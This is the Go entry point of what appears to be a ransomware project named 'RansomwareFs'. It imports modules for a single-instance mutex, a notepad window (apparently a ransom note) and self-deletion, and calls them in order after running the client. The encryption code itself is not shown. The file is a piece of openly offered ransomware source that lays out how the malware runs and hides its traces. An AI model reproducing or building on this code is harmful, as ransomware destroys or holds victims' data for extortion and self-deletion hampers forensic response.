package main

import (
	"RansomwareFs/client"
	_ "RansomwareFs/client/mutex"
	"RansomwareFs/client/new_notepad"
	"RansomwareFs/client/self_delete"
)

func main() {
	client.Run()
	new_notepad.NewNotepad()
	self_delete.SelfDelete()
}
